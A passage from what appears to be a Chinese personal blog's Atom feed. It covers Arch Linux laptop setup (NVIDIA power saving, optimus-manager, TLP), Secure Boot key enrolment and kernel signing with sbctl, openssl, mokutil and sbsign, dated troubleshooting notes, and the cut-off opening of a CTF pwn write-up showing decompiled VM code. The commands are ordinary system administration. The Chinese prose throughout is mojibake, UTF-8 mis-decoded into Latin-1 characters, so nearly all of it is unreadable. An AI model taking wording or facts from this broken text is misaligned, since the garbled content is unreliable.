href="https://github.com/Askannz/optimus-manager/blob/master/optimus-manager.conf">é»˜è®¤é…ç½®çš„æ³¨é‡Š</a>ï¼‰é™ä½è‡ªå·±çš„åŠŸè€—ï¼Œè¿™æ—¶å¯ä»¥ä¸€ç›´å¼€hybridæ¨¡å¼ã€‚æ³¨æ„ï¼Œè¿™ä¸€åŠŸèƒ½éœ€è¦nå¡æ”¯æŒï¼Œè¯·é€šè¿‡:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/driver/nvidia/gpus/0000:01:00.0/power</span><br><span class="line"># Runtime D3 status: xxxä¼šæ˜¾ç¤ºæ˜¯å¦æ”¯æŒ</span><br></pre></td></tr></table></figure><p>æ¥æŸ¥çœ‹æ˜¯å¦æ”¯æŒã€‚</p><p>è¿™ä¸€æ–¹æ¡ˆè‡ªå·±çš„å®æµ‹ï¼Œnvidia-smiä¼šæ˜¾ç¤ºæ˜¾å¡offï¼ŒåŠŸç‡å¤§æ¦‚ä¼šé™ä½åˆ°20wå·¦å³ï¼Œæ²¡æœ‰å®Œå…¨å…³é—­ã€‚ä¸è¿‡é…åˆTLPï¼ŒåŸºæœ¬ä¸Šä¸Šè¯¾ä¸€ä¸ªåŠå°æ—¶è·‘linuxåŸºæœ¬ä¸æ‰ç”µï¼Œå¾ˆæ— æ•Œï¼Œè–„çº±windowsã€‚</p><p><font color=red>âš ï¸æ³¨æ„ï¼Œç”µæºç­–ç•¥æ˜¯éå¸¸â€œä¸ªæ€§åŒ–â€çš„ï¼Œéœ€è¦å°è¯•ï¼Œè¯·ç¡®ä¿æ›´æ”¹å‰åšå¤‡ä»½ï¼Œæˆ–æ˜¯ä¿ç•™äº†é‡è£…çš„livecdï¼Œæˆ‘å°±æ˜¯åœ¨bbswitché»‘å±äº†é‡è£…çš„</font></p><h1>å®‰å…¨å¯åŠ¨</h1><p>å¯ä»¥ç»“åˆ<a href="https://zjw1nd.github.io/2025/2/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">è¿™ç¯‡</a>ä¸€èµ·çœ‹</p><p>å¦‚æœç”±äºæŸäº›åŸå› ï¼ˆæŒ‡ç“¦æ´›å…°ç‰¹å›½é™…æœåä½œå¼Švanguardï¼‰ä½ éœ€è¦å¹³å¸¸å¼€å¯å®‰å…¨å¯åŠ¨ï¼Œåˆ™å¯ä»¥å‚è€ƒè¿™é‡Œã€‚ä¸Šé¢çš„blogä¸­æä¾›äº†è‡ªå·±æ‰‹åŠ¨ç­¾åå†…æ ¸å¹¶å†™å…¥uefiçš„åŠæ³•ï¼Œ</p><p>å¯¹äºarchï¼Œæœ‰ä¸€ä¸ªå¾ˆå¥½ç”¨çš„è½¯ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sbctl</span><br></pre></td></tr></table></figure><p><font color=lightyellow>âš ï¸æ³¨æ„ï¼Œè¿™ä¸€è½¯ä»¶æœªå¿…å¯¹æ‰€æœ‰çš„ç¡¬ä»¶ç¯å¢ƒéƒ½æœ‰æ•ˆï¼Œå¯èƒ½ä»ç„¶éœ€è¦æ‰‹åŠ¨ç­¾å</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sbctl create-keys</span><br><span class="line">sbctl enroll-keys -m # å¯†é’¥å’Œå¾®è½¯çš„ä¸€èµ·ç™»å…¥uefi</span><br><span class="line">sbctl verify</span><br><span class="line">sbctl sign -s /boot/vmlinuz-linux</span><br><span class="line">sbctl sign -s /boot/EFI/BOOT/BOOTX64.EFI #  ç­¾ç½²ç›¸å…³å†…å®¹</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨sbctlçš„å¥½å¤„æ˜¯ï¼Œå…¶è‡ªå¸¦ä¸€ä¸ªèƒ½å¤Ÿåœ¨å†…æ ¸æ›´æ–°åç­¾ç½²çš„pacmanhookï¼Œçœäº‹ã€‚</p><p>æ›´å¤šå†…å®¹ä»¥åŠè‡ªå·±æ‰‹åŠ¨ç­¾åçš„ç»†èŠ‚æ“ä½œï¼Œè¯·å‚è€ƒArchWikiçš„<a href="https://wiki.archlinuxcn.org/wiki/UEFI/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8">å®‰å…¨å¯åŠ¨</a>éƒ¨åˆ†ã€‚</p><h1>ä¸€äº›å…³é”®çš„é…ç½®ï¼š</h1><h2 id="grub">grub</h2><p>/etc/default/grub<br>æ›´æ”¹åä½¿ç”¨grub-mkconfigé‡æ–°ç”Ÿæˆå¼•å¯¼</p><h2 id="sddm">sddm</h2><p>é»˜è®¤åœ¨/etc/sddm.conf.dç›®å½•ä¸‹</p><h2 id="pacman">pacman</h2><p>é•œåƒ /etc/pacman.d/mirrorlist<br>é…ç½® /etc/pacman.conf</p><h2 id="zsh-bash">zsh/bash</h2><p>~/.bashrcæˆ–.zshrc</p><h2 id="å…¶ä»–">å…¶ä»–</h2><p>ç¬¬ä¸‰æ–¹åº”ç”¨ï¼š/opt<br>è‡ªå®šä¹‰ç›¸å…³ï¼š/usr/share<br>systemctl å‘½ä»¤<br>mountå‘½ä»¤ç”¨-oæŒ‡å®šæŒ‚è½½å‚æ•°ï¼Œ-tæŒ‡å®šåˆ†åŒºï¼Œç”¨df -hæŸ¥çœ‹æŒ‚è½½æƒ…å†µï¼Œfdisk -læŸ¥çœ‹ç£ç›˜æƒ…å†µ</p><h1>é€šç”¨æ’é”™</h1><h2 id="journalctl">journalctl</h2><p>journalctlå‘½ä»¤å¯ä»¥è¾“å‡ºsystemdçš„æ—¥å¿—ï¼Œå‚è€ƒå¸®åŠ©å‚æ•°ï¼Œå…¶å¯ä»¥è¾“å‡ºå¾ˆå¤šä¸œè¥¿ï¼ŒåŒ…æ‹¬å¯åŠ¨è¿‡ç¨‹ä¸­çš„æ—¥å¿—ã€‚</p><h2 id="Arch-LiveCD">Arch LiveCD</h2><p>ç”¨ä½ çš„å®‰è£…ç›˜ï¼Œå…¶è‡ªå¸¦ä¸€ä¸ªminiçš„archç³»ç»Ÿï¼Œå’Œæˆ‘ä»¬å®‰è£…æ—¶å€™åšçš„ä¸€æ ·ï¼Œå°†ä¸»ç³»ç»ŸæŒ‚è½½åˆ°/mntä¹‹åï¼Œå¯ä»¥åœ¨ä½ çš„ä¸»ç³»ç»Ÿç¿»è½¦ä¹‹åç”¨å…¶ä¿®å¤ã€‚æˆ‘åœ¨å°è¯•æ›¿æ¢è¿è¡Œåº“çš„æ—¶å€™å°†ä¸€ä¸ªä½ç‰ˆæœ¬çš„libm.so.6æ”¾å…¥äº†ç³»ç»Ÿlibåº“ï¼ˆæ”¹åï¼‰ç»“æœå…¨çƒ‚äº†ï¼Œå‘½ä»¤ç”¨ä¸äº†åŠ ç³»ç»Ÿå…³æœºæ— æ³•å¯åŠ¨ï¼Œç›´æ¥æ’ä¸ŠliveCDæ”¹ååæŒ‚è½½æ”¹å›æ¥å°±è¡Œäº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;é¦–å…ˆçš„é¦–å…ˆï¼Œæœ€é‡è¦çš„å‚è€ƒæ¥è‡ªäº&lt;a href=&quot;https://arch.icekylin.online/guide/rookie/pre-install.html&quot;&gt;archlinuxç®€æ˜æŒ‡å—&lt;/a&gt;&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;h1&gt;å†™åœ¨å‰é¢&lt;/h1&gt;</summary>
      
    
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/categories/linux/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>linuxæ‚è°ˆï¼ˆæŒç»­æ›´æ–°ï¼‰</title>
    <link href="https://zjw1nd.github.io/2025/02/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zjw1nd.github.io/2025/02/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-02-24T08:26:14.000Z</published>
    <updated>2025-03-10T03:12:57.542Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« å¯èƒ½éƒ½æ˜¯ä»€ä¹ˆä¹Ÿä¸æ‡‚çš„æ—¶å€™è®°å½•ä¸€äº›äº†è§£åˆ°çš„çŸ¥è¯†ï¼Œkernel pwnä¹Ÿä¼šæ”¾åœ¨linuxè¿™ä¸ªç±»ä¸‹ï¼Œå¯èƒ½ä»¥åå­¦äº†å†…æ ¸pwnä¼šæœ‰ä¸åŒçš„æ„Ÿå—å§ã€‚</p><h2 id="2023-11-26-linuxæ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸‹é‚£äº›éƒ½æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ">2023.11.26 linuxæ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸‹é‚£äº›éƒ½æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ</h2><p>å‚è€ƒ<a href="https://www.runoob.com/linux/linux-system-contents.html">èœé¸Ÿæ•™ç¨‹</a>çš„å†…å®¹ã€‚ç®€å•è°ˆç‚¹ç†è§£ã€‚<br>â€œæ–‡ä»¶æ˜¯å¯¹å­—èŠ‚æµçš„æŠ½è±¡ã€‚â€è€Œlinuxä¹Ÿæ˜¯ä¸€ä¸ªæœ‰ç€â€œä¸€åˆ‡çš†æ–‡ä»¶â€æ€æƒ³çš„ç³»ç»Ÿã€‚è€Œæ— è®ºæ˜¯ä»€ä¹ˆæ ·çš„linuxå‘è¡Œç‰ˆï¼ŒåŸºæœ¬æ ¹ç›®å½•ä¸‹éƒ½æ˜¯é‚£å‡ ä¸ªæ–‡ä»¶å¤¹ã€‚ç®€å•äº†è§£ä¸‹è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä»¥åŠå®ƒæ ¹ç›®å½•ä¸‹é‚£äº›æ–‡ä»¶å¤¹åå­—çš„å«ä¹‰ã€‚ç±»ä¼¼Program Filesè¿™ç§å§ã€‚</p><p>è‰æ–‡ä»¶ç³»ç»Ÿå¥½å¤æ‚ï¼Œä¸å½“äº†ä¸å½“linuxé«˜æ‰‹äº†.jpg</p><h2 id="2024-3-å…³äºlinuxå®‰è£…ã€å†…æ ¸å‡çº§ã€æ˜¾å¡é©±åŠ¨ã€å†…æ ¸ç­¾åç­‰å°æ€»ç»“">2024.3 å…³äºlinuxå®‰è£…ã€å†…æ ¸å‡çº§ã€æ˜¾å¡é©±åŠ¨ã€å†…æ ¸ç­¾åç­‰å°æ€»ç»“</h2><p>è‡ªå·±èŠ±200ä¹°äº†ä¸ªå›ºæ€uç›˜ï¼Œè£…ä¸€æ‰‹linuxï¼Œæ‰“ç®—ææˆä¸€ä¸ªå¹³å¸¸ç”¨çš„ç¯å¢ƒã€‚åŒæ—¶windowsä¸‹è£…äº†kaliçš„wslç‰ˆæœ¬ï¼Œé¡ºå¸¦å‡çº§äº†win11ä¸“ä¸šç‰ˆã€‚</p><p>çœ‹ä¸­çœäº‹çš„é›†æˆå›¾å½¢åŒ–ç•Œé¢+ä¸­æ–‡ç¤¾åŒºè£…äº†deepinï¼Œè¿™ä¸ªè¿‡ç¨‹å¾ˆç®€å•ï¼ŒæŒ‰ç…§å®˜æ–¹æ•™ç¨‹ï¼ˆæœ‰é›†æˆå¥½çš„åº”ç”¨ç¨‹åºï¼‰ï¼Œä¸€ä»¶é…ç½®å®‰è£…å°±å¥½äº†ã€‚<br>è¸©å‘ä¸»è¦æ˜¯æ˜¾ç¤ºæ–¹é¢çš„é—®é¢˜ï¼Œä¸ªäººç¬”è®°æœ¬ä¸€ç›´å¼€å¯çš„ç‹¬æ˜¾ç›´è¿ï¼Œæœ€æ—©çš„æ˜¾å¡é©±åŠ¨æ— æ³•è°ƒèŠ‚äº®åº¦ï¼Œdeepinæºaptå®‰è£…çš„è¯æŠ¥é”™å’Œå†…æ ¸çš„é©±åŠ¨ç‰ˆæœ¬ç‰ˆæœ¬ä¸ç¬¦ï¼Œè€Œä¸”ä»ç„¶æ— æ³•è°ƒèŠ‚äº®åº¦ã€‚å„ç§è¸©å‘å°±è·³è¿‡ï¼Œæ€»ä¹‹è§£å†³è¿‡ç¨‹æ˜¯å»è‹±ä¼Ÿè¾¾å®˜ç½‘ä¸‹è½½å¯¹åº”å‹å·çš„ç”Ÿäº§ç¯å¢ƒé—­æºé©±åŠ¨åå®‰è£…ï¼ˆé€€å‡ºå›¾å½¢åŒ–ç•Œé¢ç„¶åç›´æ¥æ‰¾åˆ°æ–‡ä»¶æ‰§è¡Œï¼‰ï¼Œå‚è€ƒ<a href="https://bbs.deepin.org/zh/post/232923?offset=0&amp;postId=1317417">è¿™ç¯‡æ–‡ç« </a>ã€‚å®‰è£…å¥½ä¹‹åå¼€å¯æ˜¾å¡çš„äº®åº¦è°ƒèŠ‚ï¼Œè·³è¿‡ä¸èƒ½ç”¨çš„æ–¹æ³•ï¼Œå‚è€ƒçš„<a href="https://bbs.deepin.org.cn/zh/post/257837">è¿™ç¯‡</a>ï¼Œconfæ–‡ä»¶ä¸­å¼€å¯<code>EnableBrightnessControl=1</code>ï¼Œä¹Ÿæ˜¯æŒºå¹½é»˜çš„ã€‚</p><p>ç„¶åè‡ªå·±ç¼–è¯‘å‡çº§äº†ä¸€ä¸‹å†…æ ¸ï¼ˆèƒ½è§£å†³ç¬”è®°æœ¬åˆç›–å¾…æœºæ— æ³•å”¤é†’çš„é—®é¢˜ï¼‰ï¼Œæ–°å°±æ˜¯å¥½ï¼ˆé”™ä¹±ï¼‰ã€‚å†…æ ¸ç¼–è¯‘å‚è€ƒ<a href="https://linux.cn/article-16252-1.html">è¿™ç¯‡æ–‡ç« </a>ï¼Œè¯´çš„éå¸¸è¯¦ç»†äº†ã€‚ä½†æ˜¯æ‹¯æ•‘è€…æ— æ³•è¯†åˆ«è‡ªå¸¦éŸ³å“å’Œéº¦å…‹é£çš„é—®é¢˜ä¼¼ä¹è¢«å¿˜è®°äº†â€¦çœ‹åˆ°å†…æ ¸6.3ç‰ˆæœ¬çš„æ—¶å€™æœ‰å¤§ä½¬è¯´è¿™ä¸ªé—®é¢˜å’Œä¸»æ¿æœ‰å…³ç³»ï¼Œæäº¤å†…æ ¸patchè¢«æ‹’ç»äº†è¯´è¿™ä¸ªé—®é¢˜å·²ç»åœ¨è§£å†³ï¼Œå¯æƒœç›®å‰è¿˜æ²¡æœ‰ï¼Œå‚è€ƒ<a href="https://bbs.deepin.org/post/249003">è¿™ç¯‡</a>ï¼ˆæ²¡ä»€ä¹ˆç”¨ï¼‰å’Œ<a href="https://github.com/xuwd1/lenovo-legion-slim7i-gen7-knowledges/wiki/%E8%A7%A3%E5%86%B3%E6%97%A0%E5%A4%96%E6%94%BE%E5%A3%B0%E9%9F%B3%E7%9A%84%E9%97%AE%E9%A2%98">è¿™ç¯‡</a>æ–‡ç« ã€‚</p><blockquote><p>å¦å¤–è¿˜èƒ½å°†è‡ªå·±çš„idåŠ åœ¨å†…æ ¸åé¢ï¼Œå¥½ç©ã€‚</p></blockquote><p>ç„¶åé€‰æ‹©çš„æœ€æ–°çš„6.8.1å†…æ ¸ã€‚è™½ç„¶æ˜¯å®˜æ–¹å‘å¸ƒçš„å†…æ ¸ä½†æ˜¯æ²¡æœ‰å‘è¡Œç‰ˆçš„ç­¾åï¼Œsecure bootè¿‡ä¸äº†ï¼Œwindowsç©ç“¦é‚£ä¸ªbåä½œå¼Šåˆè¦æ±‚å¼€secure bootå¾ˆçƒ¦ï¼Œæ‰€ä»¥åˆè¦è‡ªå·±å»ç­¾åå†…æ ¸ã€‚ç›´æ¥é—®äº†copilotåŠ ä¸Šè‡ªå·±æœç´¢ï¼Œæ‰§è¡Œä»¥ä¸‹å‡ æ¡å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subj &quot;/CN=ZJ Secure Boot Signing Key/&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯èƒ½ä¼šè¦æ±‚è¾“å…¥å¯†ç ï¼Œç­‰ä¸‹uefiå¯åŠ¨ä¼šç”¨</span></span><br><span class="line">sudo mokutil --import MOK.der</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿™é‡Œè¦å…ˆå®‰è£…sbsignï¼Œaptå°±è¡Œ sudo apt install sbsigntool</span></span><br><span class="line">sudo sbsign --key MOK.priv --cert MOK.der --output /boot/vmlinuz-$(uname -r) /boot/vmlinuz-$(uname -r)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŠ¥é”™äº†ï¼Œé—®äº†copilotç„¶åå°†è¯ä¹¦æ”¹æˆ.pemæ ¼å¼ï¼š</span></span><br><span class="line">openssl x509 -in MOK.der -inform DER -out MOK.pem -outform PEM</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é‡æ–°æ‰§è¡Œ</span></span><br><span class="line">sudo sbsign --key MOK.priv --cert MOK.pem --output /boot/vmlinuz-$(uname -r) /boot/vmlinuz-$(uname -r)</span><br></pre></td></tr></table></figure><p>é‡å¯å³å¯ï¼Œè¿™æ—¶å€™å°±å¯ä»¥æ‰“å¼€secure bootäº†ã€‚ä»linuxé‡å¯çš„æ—¶å€™ä¼šè¿›å…¥ä¸€ä¸ªå¼•å¯¼ç•Œé¢ï¼Œé€‰æ‹©enroll keyç„¶åè¾“å…¥å¯†ç å³å¯ã€‚ä½†æ˜¯ç¬¬ä¸€æ¬¡å¯åŠ¨guiç•Œé¢ç›´æ¥èŠ±å±äº†ï¼Œå“å¾—æˆ‘ä»¥ä¸ºæ˜¾å¡é©±åŠ¨æ¨¡å—ä¹Ÿè¦å•ç‹¬ç­¾åï¼Œç»“æœå†é‡å¯ä¸€æ¬¡ä¸€åˆ‡å°±æ­£å¸¸äº†ã€‚è¿™æ˜¯ä¸€ä¸ªæ²¡æœ‰ä»»ä½•å…³äºå¯†ç å­¦ã€è¯ä¹¦ã€ç­¾åã€éå¯¹ç§°åŠ å¯†ç»éªŒçš„äººæ‰‹åŠ¨ç­¾åå†…æ ¸çš„ç»å†ã€‚</p><h2 id="2024-6-2-Archå¯åŠ¨">2024.6.2 Archå¯åŠ¨</h2><p>deepinV20çš„glibcç‰ˆæœ¬å¤ªä½äº†å¾ˆéš¾å—ï¼Œå…ˆæ˜¯é‡è£…äº†ä¸€ä¸ªV23ï¼Œä½†æ˜¯æ•ˆæœä¸æ˜¯å¾ˆç†æƒ³ï¼Œä¸å¤ªå–œæ¬¢V23çš„UIé£æ ¼ï¼Œè€Œä¸”æµç•…åº¦è¿˜æœ‰ç¼ºé™·ã€‚çŠ¹è±«äº†ä¸€ä¸‹åŠ å…¥Archç¥æ•™ï¼Œå¥½åœ¨ç°åœ¨å·²ç»æœ‰archinstallçš„è„šæœ¬å¯ä»¥å¿«é€Ÿé…ç½®ã€‚ä¸å¾—ä¸è¯´KDE plasmaå°±æ˜¯æ¼‚äº®â€”â€”ä½†æ˜¯æ¶‰åŠæ˜¾ç¤ºé—®é¢˜å°±å¾ˆå¤šäº†ã€‚<br>å¤–æ¥å±å¹•ä¸å¥½ç”¨ï¼Œæ˜¾å¡åˆ‡æ¢çš„é—®é¢˜ï¼Œè‹±ä¼Ÿè¾¾å¯¹waylandä¸æ”¯æŒâ€¦å¤ªå²äº†ã€‚è¿˜æ˜¯å†³å®šä»¥åç”¨è¿™ä¸ªç³»ç»Ÿå°±integratedæ¨¡å¼ç®—äº†ï¼Œæµç•…åº¦ä»€ä¹ˆçš„ä¹Ÿå¾ˆé«˜ç”¨ç€å¾ˆèˆ’æœã€‚è¿˜éœ€è¦æŠŠå®‰è£…çš„è½¯ä»¶ä¼˜åŒ–ä¸€ä¸‹ç²¾ç®€ä¸€ä¸‹ä½“ç§¯ã€‚æ¯•ç«Ÿéƒ½ç”¨archäº†å¤šå°‘è¿˜æ˜¯å¾—æ´ç™–ä¸€ä¸‹ã€‚</p><p>å½»åº•æ”¾å¼ƒè‹±ä¼Ÿè¾¾ï¼Œnouveauæ¨¡å—å‘½åé»‘åå•äº†æ²¡è£…ï¼ŒæŒ‰ç…§å„ç§åŠæ³•åŒ…æ‹¬ä¸ä»å›¾å½¢ç•Œé¢å¯åŠ¨ä¹Ÿè°ƒäº†ä½†æ˜¯æ²¡ç”¨ï¼Œè‹±ä¼Ÿè¾¾é©±åŠ¨å¼€ä¸äº†ï¼Œåº”è¯¥æ˜¯pacmançš„é‚£ä¸ªç‰ˆæœ¬å¯èƒ½æ²¡æ³•è‡ªåŠ¨è£…è½½é©±åŠ¨ï¼Œå¯¼è‡´nå¡é»˜è®¤é©±åŠ¨ä¸€ç›´æ˜¯nouveauä½†æ˜¯æˆ‘åˆç¦ç”¨äº†å®ƒå°±ä¸€ç›´æ²¡æ³•è¾“å‡ºã€‚æ‡’å¾—æäº†</p><p>2024.8ä¸æ­»å¿ƒåˆæäº†ä¸€æ¬¡ï¼Œmkinitcpioåšå†…æ ¸é•œåƒç›´æ¥å°†nvidiaæŒ‚è½½ä¸Šï¼Œé©±åŠ¨æ˜¯è£…ä¸Šäº†æ˜¾å¡ä¹Ÿèƒ½ç”¨ï¼ˆåœ¨xorgä¸‹ï¼‰ä½†æ˜¯å¤–æ¥å±å¹•è¿˜æ˜¯æ²¡ç”¨ï¼Œè¿è¡Œä¸€ä¸‹nvidia-xconfigç›´æ¥å°†å›¾å½¢åŒ–å¹²æ²¡äº†ï¼Œè¯•äº†ç½‘ä¸Šçš„è§£å†³æ–¹æ³•éƒ½ä¸è¡Œï¼Œæœ€åç›´æ¥åˆ äº†xorg.confç„¶åé…ç½®sddm waylandå¯åŠ¨ æ»šå§</p><h2 id="2025-2">2025.2</h2><p>æœ€è¿‘è¯¾ç¨‹è®¾è®¡æ¯”è¾ƒè½»æ¾ï¼Œé‡æ–°æè¿™ä¸ªarchï¼Œé—²é±¼èŠ±äº†20è¿œç¨‹è£…äº†ä¸‹ï¼Œæœ€åå‘ç°æ˜¯nvidiaçš„é—­æºé©±åŠ¨å’Œå†…æ ¸ç‰ˆæœ¬å¼ºç»‘å®šï¼Œé•¿æ—¶é—´æ²¡æ»šå°±å¯„äº†ï¼Œè£…çš„æ—¶å€™è¿˜è¯´æˆ‘è¿™ä¾èµ–ä¹Ÿçƒ‚ã€‚ã€‚ã€‚é—®é¢˜ä¸€å †ä½†æ€»ç®—è£…ä¸Šäº†ï¼Œç„¶è€Œæˆ‘è‡ªå·±æŠ˜è…¾åŒæ˜¾å¡çš„æ—¶å€™ï¼Œç”¨äº†envycontrolï¼Œåˆ‡æ¢åˆ°é›†æ˜¾ä¸€å¼€æœºç›´æ¥èŠ±å±äº†ï¼Œlivecdè¯•ç€ä¿®äº†ä¸‹ä¹Ÿæ²¡åŠæ³•ï¼Œè€ƒè™‘åˆ°è£…çš„æ—¶å€™çš„é‚£ä¸€å †é—®é¢˜ï¼Œå¹²è„†æ¨å€’é‡æ¥ç®—äº†ã€‚</p><p>é‡è£…archåè€Œæ˜¯æœ€ç®€å•çš„ï¼Œè£…å¥½ä¹‹åç”¨btrfsæ–‡ä»¶ç³»ç»Ÿå›æ»šä¸è¦å¤ªçˆ½ï¼Œext4åƒå±å»å§ã€‚é‡è£…ä¹‹åç›´æ¥pacman nvidiaï¼Œæœ‰äº†å‰é¢è¸©å‘çš„ç»éªŒäºŒå‘¨ç›®é€Ÿé€šäº†ï¼Œé…ç½®å†…æ ¸å‚æ•°ä¼¼ä¹éƒ½ä¸ç”¨å°±èƒ½å¼€ï¼Ÿ</p><p>æ€»ä¹‹optimus managerä¹Ÿæ˜¯æä¸Šäº†ï¼Œè£…å¥½ä¹‹åç”µæºç­–ç•¥bbswitchä¸€é”™ç›´æ¥å›æ»šæˆ–è€…é‡è£…æ‡’å¾—bbã€‚æ•´ç†ä¸€ä¸ªæ–°çš„æ€»é›†ç¯‡å¥½å§</p><h2 id="2025-3">2025.3</h2><p>å› ä¸ºpatch c++libçš„æ—¶å€™åˆ·åˆ°å¸–å­ç›´æ¥copy libm.soåˆ°ç³»ç»Ÿè·¯å¾„ä¸‹åšæ›¿æ¢çš„æƒ³è¯•è¯•ï¼Œç»“æœç›´æ¥çƒ‚äº†ï¼Œå‘½ä»¤ç”¨ä¸äº†æ“ä½œåšä¸äº†ï¼Œå¼€æœºç›´æ¥è“å±ã€‚è¿™æ—¶å€™ç›´æ¥æ’ä¸Šå¯åŠ¨ç›˜æŠŠä¸»ç³»ç»ŸæŒ‚è½½ä¸Šæ”¹å›æ¥å°±è¡Œã€‚</p><h2 id="shellè„šæœ¬å­¦ä¹ ">shellè„šæœ¬å­¦ä¹ </h2><p>shellå£°æ˜ <code>#! /bin/bash</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™ç¯‡æ–‡ç« å¯èƒ½éƒ½æ˜¯ä»€ä¹ˆä¹Ÿä¸æ‡‚çš„æ—¶å€™è®°å½•ä¸€äº›äº†è§£åˆ°çš„çŸ¥è¯†ï¼Œkernel pwnä¹Ÿä¼šæ”¾åœ¨linuxè¿™ä¸ªç±»ä¸‹ï¼Œå¯èƒ½ä»¥åå­¦äº†å†…æ ¸pwnä¼šæœ‰ä¸åŒçš„æ„Ÿå—å§ã€‚&lt;/p&gt;
&lt;h2 id=&quot;2023-11-26-linuxæ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸‹é‚£äº›éƒ½æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ&quot;&gt;2023.11.26 linuxæ–‡ä»¶</summary>
      
    
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/categories/linux/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>IDA-Better_printkæ¨å¹¿</title>
    <link href="https://zjw1nd.github.io/2025/02/20/IDA-Better-printk%E6%8E%A8%E5%B9%BF/"/>
    <id>https://zjw1nd.github.io/2025/02/20/IDA-Better-printk%E6%8E%A8%E5%B9%BF/</id>
    <published>2025-02-20T14:22:10.000Z</published>
    <updated>2025-02-21T08:08:27.614Z</updated>
    
    
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/categories/Develop/"/>
    
    
    <category term="é€†å‘" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="Develop" scheme="https://zjw1nd.github.io/tags/Develop/"/>
    
  </entry>
  
  <entry>
    <title>ciscn_ccb2025åˆèµ›-avmé‡åšwp</title>
    <link href="https://zjw1nd.github.io/2025/02/20/ciscn-ccb2025%E5%88%9D%E8%B5%9B-avm%E9%87%8D%E5%81%9Awp/"/>
    <id>https://zjw1nd.github.io/2025/02/20/ciscn-ccb2025%E5%88%9D%E8%B5%9B-avm%E9%87%8D%E5%81%9Awp/</id>
    <published>2025-02-20T14:19:56.000Z</published>
    <updated>2025-02-21T08:01:11.163Z</updated>
    
    <content type="html"><![CDATA[<h1>é¢˜ç›®åˆ†æ</h1><h2 id="é€†å‘è™šæ‹Ÿæœºç»“æ„">é€†å‘è™šæ‹Ÿæœºç»“æ„</h2><p>è¿™é“é¢˜ç›®çš„è™šæ‹Ÿæœºè¿˜ç®—è§„æ•´ï¼Œä»mainå‡½æ•°å¼€å§‹çœ‹ï¼Œä»å¯¹è™šæ‹Ÿæœºåˆå§‹åŒ–çš„å‡½æ•°å…¥æ‰‹å¹¶ç»“åˆä»£ç æ‰§è¡Œçš„å‡½æ•°å¯ä»¥çœ‹å‡ºï¼Œæ•´ä½“çš„vmç»“æ„æ”¾åœ¨äº†bssï¼ŒåŒ…æ‹¬32ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œripï¼Œä»£ç æŒ‡é’ˆå’Œä»£ç å¤§å°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm *__fastcall <span class="title function_">initvm</span><span class="params">(<span class="keyword">struct</span> vm *mem, __int64 code, <span class="type">unsigned</span> __int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] 